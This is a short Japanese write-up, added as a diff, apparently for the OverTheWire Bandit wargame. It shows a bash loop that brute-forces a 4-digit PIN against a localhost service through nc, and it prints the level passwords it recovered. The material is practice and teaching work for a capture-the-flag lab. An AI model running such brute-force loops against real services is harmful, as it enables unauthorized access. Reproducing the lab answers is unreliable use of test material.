@@ -1,0 +1,24 @@
+shell scriptでbrute force attckを仕掛ける
+
+```
+#!/bin/bash
+
+password=gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8
+
+for i in {0000..9999}
+do
+        echo "$password $i"
+done | nc localhost 30002
+```
+
+結論から言うとこの様にした。
+やっていることとしては特に難しく無いと思うが、{0000..9999}で範囲が指定できる
+他にも`for i in {0..9}{0..9}{0..9}{0..9}`としても可能
+そして、その結果をncコマンドに繋ぐ
+
+```
+...
+Wrong! Please enter the correct current password and pincode. Try again.
+Correct!
+The password of user bandit25 is iCi86ttT4KSNe1armKiwbQNmB3YJP3q4
+```
